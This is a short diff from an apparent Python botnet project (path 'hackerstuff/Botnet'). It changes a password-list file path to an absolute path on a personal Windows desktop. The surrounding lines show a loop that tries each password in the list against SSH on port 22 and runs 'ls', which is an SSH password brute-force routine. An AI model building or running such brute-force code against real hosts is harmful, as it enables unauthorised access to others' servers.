@@ -34,7 +34,7 @@ class bot:
                         self.ssh = 1
                 else:
                     passwordAttempts = 0
-                    for password in open("List.txt").readlines():
+                    for password in open("C:/Users/Mason Mollenkamp/Desktop/repo/mathon/hackerstuff/Botnet/list.txt").readlines():
                         passwordAttempts += 1
                         try:
                             print(commandSHH(host, 22, user, password, "ls"))
